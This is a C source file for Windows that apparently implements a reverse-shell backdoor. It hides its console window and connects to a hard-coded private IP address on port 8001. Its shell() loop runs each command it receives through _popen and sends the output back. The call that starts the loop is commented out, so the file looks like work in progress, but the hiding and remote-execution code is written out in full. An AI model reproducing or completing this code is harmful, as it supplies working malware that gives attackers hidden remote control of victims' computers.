#include <stdio.h>
#include <stdlib.h>
// #include <unistd.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
/*       func            defination */
#define bzero(p, size) (void)memset((p), 0, (size))

void EndFunc()
{
    // Read user input from the console
    char userInput[256];
    printf("Enter To Exit: ");
    fgets(userInput, sizeof(userInput), stdin);
}

int sock;

void shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    while (1)
    {
        /*  */
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, 1024, 0);
        if (strncmp("q", buffer, 1) == 0)
        {
            /* ASSUMING WE ALREADY HAVE THE SOCKET */
            closesocket(sock);
            WSACleanup();
        }
        else
        {
            /* read the buffer */
            FILE *fp;
            fp = _popen(buffer, "r");
            while (fgets(container, 1024, fp) != NULL) /* from fp -> container and if container>1024 then container -> total_response */
            {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    HWND stealth;
    /* ALLOC THE WINDOW CONSOLE */
    AllocConsole();
    /* FIND THE HANDLE CONSOLE AND HIDE IT  */
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    /* HIDE THE WINDOW CONSOLE  */
    ShowWindow(stealth, 0);

    /* SERVER ADDRESS CONFIG */
    struct sockaddr_in sa;
    unsigned short serverPort;
    char *serverIp;
    /* wsaData contains information windowsSocket // necessary for socket connection */
    WSADATA wsaData;
    serverIp = "192.168.189.130";
    serverPort = 8001;

    /*  */
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        printf("[+] SOMETHING WENT WRONG\n");
        EndFunc();
        exit(1);
    }
    printf("[+] WSASTARTUP SUCCESS\n");
    /*
    AF_INET-> IPv4
    SOCK_STREAM->TCP_IP
    */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("Failed to create client socket.\n");
        WSACleanup();
        EndFunc();
        return 1;
    }
    memset(&sa, 0, sizeof(sa)); /* "12345"->"00000" */
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(serverIp);
    sa.sin_port = htons(serverPort);
    printf("[+] TRYING TO CONNECT TO SOCKET ..\n");

    /*  */
    // if (connect(sock, (struct sockarr *)&sa, sizeof(sa)) == SOCKET_ERROR)
    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR)
    {
        printf("[+] Failed to create client socket.\n");
        WSACleanup();
        EndFunc();
        exit(1);
    }
    printf("[+] CONNECTION SUCESS FULL");
    // Shell();
    WSACleanup();
    EndFunc();
}